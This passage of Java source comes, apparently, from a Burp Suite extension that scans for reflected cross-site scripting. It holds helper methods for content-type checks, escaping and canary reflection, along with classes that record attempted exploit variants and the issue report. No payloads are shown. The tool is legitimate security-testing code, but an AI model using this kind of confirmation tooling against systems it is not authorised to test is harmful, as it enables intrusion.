            byte[] pat = helpers.stringToBytes(needle);
            int idx = helpers.indexOf(data, pat, true, 0, data.length);
            if (idx >= 0) {
                out.add(new int[]{idx, idx + pat.length});
            }
        } catch (Exception ignored) {
            // markers are best-effort
        }
        return out;
    }

    private String buildSnippet(String body, int start, int len) {
        int s = Math.max(0, start);
        int e = Math.min(body.length(), s + len);
        String raw = body.substring(s, e);
        return esc(raw);
    }

    private static boolean isWhite(char c) {
        return c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '\f';
    }

    private static boolean isNameStart(char c) {
        return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z');
    }

    private static boolean isNameChar(char c) {
        return isNameStart(c) || (c >= '0' && c <= '9') || c == '-' || c == ':';
    }

    private static boolean isEventHandler(String attr) {
        return attr != null && attr.length() > 2 && attr.startsWith("on");
    }

    private static boolean isUrlAttr(String attr) {
        if (attr == null) {
            return false;
        }
        switch (attr) {
            case "href":
            case "src":
            case "action":
            case "formaction":
            case "xlink:href":
            case "poster":
            case "data":
            case "background":
            case "cite":
            case "ping":
                return true;
            default:
                return false;
        }
    }

    private static boolean regionIgnoreCase(String s, int at, String needle) {
        return s.regionMatches(true, at, needle, 0, needle.length());
    }

    private static int firstNonWhitespace(String s) {
        for (int i = 0; i < s.length(); i++) {
            if (!isWhite(s.charAt(i))) {
                return i;
            }
        }
        return 0;
    }

    /** All distinct reflection sites of the canary (skipping the interleaved
     *  copies that belong to one probe block). */
    private List<Integer> reflectionSites(String haystack, String needle) {
        List<Integer> out = new ArrayList<>();
        int from = 0;
        while (true) {
            int idx = haystack.indexOf(needle, from);
            if (idx < 0) {
                break;
            }
            out.add(idx);
            from = idx + needle.length();
            int guard = 0;
            while (guard < SPECIALS.length + 1) {
                int next = haystack.indexOf(needle, from);
                if (next < 0 || next - from > 64) {
                    break;
                }
                from = next + needle.length();
                guard++;
            }
        }
        return out;
    }

    /**
     * True if the response content type is one the user enabled in Content Type
     * Management (Settings). Substring match either way, so "html" matches
     * "text/html; charset=utf-8" and vice-versa. When the list is empty, falls
     * back to the built-in textual set so detection still works out of the box.
     */
    private boolean contentTypeAllowed(String ct) {
        String c = ct == null ? "" : ct.toLowerCase(Locale.ROOT);
        java.util.List<String> enabled = null;
        try {
            enabled = settings != null ? settings.getEnabledContentTypes() : null;
        } catch (Exception ignored) {
            enabled = null;
        }
        if (enabled != null && !enabled.isEmpty()) {
            if (c.isEmpty()) {
                return true; // no content-type header: don't drop it
            }
            for (String e : enabled) {
                if (e == null || e.isEmpty()) {
                    continue;
                }
                String le = e.toLowerCase(Locale.ROOT);
                if (c.contains(le) || le.contains(c)) {
                    return true;
                }
            }
            return false;
        }
        // Fallback: built-in textual set.
        return c.isEmpty() || c.contains("html") || c.contains("json")
                || c.contains("javascript") || c.contains("xml") || c.contains("text");
    }

    private MimeInfo classifyMime(IResponseInfo respInfo) {
        MimeInfo m = new MimeInfo();
        String ct = "";
        try {
            for (String h : respInfo.getHeaders()) {
                String low = h.toLowerCase(Locale.ROOT);
                if (low.startsWith("content-type:")) {
                    ct = low.substring("content-type:".length()).trim();
                }
                if (low.startsWith("x-content-type-options:") && low.contains("nosniff")) {
                    m.nosniff = true;
                }
            }
        } catch (Exception ignored) {
            // headers unavailable
        }
        m.contentType = ct;
        String stated = safeLower(respInfo.getStatedMimeType());
        String inferred = safeLower(respInfo.getInferredMimeType());
        m.isJson = ct.contains("json") || stated.contains("json") || ct.contains("+json");
        m.isJavaScript = ct.contains("javascript") || ct.contains("ecmascript")
                || stated.contains("script") || ct.contains("text/js");
        boolean declaredHtml = ct.contains("text/html") || ct.contains("application/xhtml")
                || ct.isEmpty() || ct.contains("text/plain");
        m.htmlRenderable = declaredHtml || (inferred.contains("html") && !m.nosniff);
        if (m.isJson && m.nosniff) {
            m.htmlRenderable = false;
        }
        return m;
    }

    private static String safeLower(String s) {
        return s == null ? "" : s.toLowerCase(Locale.ROOT);
    }

    private static String displayChar(char c) {
        if (c == ' ') {
            return "(space)";
        }
        return String.valueOf(c);
    }

    private static String esc(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                .replace("\"", "&quot;").replace("'", "&#39;");
    }

    private static String insertionTypeName(byte type) {
        switch (type) {
            case 0x00: return "URL parameter";
            case 0x01: return "Body parameter";
            case 0x02: return "Cookie";
            case 0x03: return "XML value";
            case 0x05: return "Multipart parameter";
            case 0x06: return "JSON value";
            case 0x07: return "Request header";
            case 0x20: return "URL path folder";
            case 0x25: return "URL path filename";
            default: return "Parameter";
        }
    }

    // ------------------------------------------------------------------
    // Value objects
    // ------------------------------------------------------------------

    private static final class CharFate {
        boolean present;
        boolean unescaped;
        boolean backslashEscaped;
        boolean htmlEncoded;
        boolean urlEncoded;
        boolean stripped;
    }

    private static final class MimeInfo {
        String contentType = "";
        boolean isJson;
        boolean isJavaScript;
        boolean htmlRenderable;
        boolean nosniff;

        String describe() {
            String ct = contentType == null || contentType.isEmpty() ? "no Content-Type" : contentType;
            return ct + (nosniff ? "; nosniff" : "");
        }
    }

    private static final class Finding {
        Ctx ctx;
        String contextLabel;
        double confidence;
        boolean isJson;
        String poc;
        String reason;
        String severity = "High";
        Map<Character, CharFate> fate;
        String snippet; // HTML-escaped live reflection, set after confirmation
    }

    private static final class Confirmation {
        IHttpRequestResponse requestResponse; // the request/response that confirmed
        String injectedValue;                 // full injected value (markers + poc)
        String poc;                           // the winning exploit payload
        String technique = "direct";          // which bypass technique confirmed it
        boolean confirmed;
        String snippet;
        final List<Attempt> attempts = new ArrayList<>(); // every variant tried
    }

    /** One confirmation attempt (a payload variant) and its live request/response. */
    private static final class Attempt {
        final String label;
        final String poc;
        final String injectedValue;
        final IHttpRequestResponse rr;
        final boolean confirmed;
        Attempt(String label, String poc, String injectedValue, IHttpRequestResponse rr, boolean confirmed) {
            this.label = label;
            this.poc = poc;
            this.injectedValue = injectedValue;
            this.rr = rr;
            this.confirmed = confirmed;
        }
    }

    /**
     * Self-contained issue carrying only dynamic, real-time evidence. Background
     * and remediation are intentionally empty.
     */
    private static final class DynamicScanIssue implements IScanIssue {
        private final IHttpService service;
        private final URL url;
        private final IHttpRequestResponse[] messages;
        private final String name;
        private final String severity;
        private final String confidence;
        private final String detail;

        DynamicScanIssue(IHttpService service, URL url, IHttpRequestResponse[] messages,
                         String name, String severity, String confidence, String detail) {
            this.service = service;
            this.url = url;
            this.messages = messages;
            this.name = name;
            this.severity = severity;
            this.confidence = confidence;
            this.detail = detail;
        }

        @Override public URL getUrl() { return url; }
        @Override public String getIssueName() { return name; }
        @Override public int getIssueType() { return 0x00200100; } // Reflected XSS
        @Override public String getSeverity() { return severity; }
        @Override public String getConfidence() { return confidence; }
        @Override public String getIssueBackground() { return ""; }
        @Override public String getRemediationBackground() { return ""; }
        @Override public String getIssueDetail() { return detail; }
        @Override public String getRemediationDetail() { return ""; }
        @Override public IHttpRequestResponse[] getHttpMessages() { return messages; }
        @Override public IHttpService getHttpService() { return service; }
    }
}
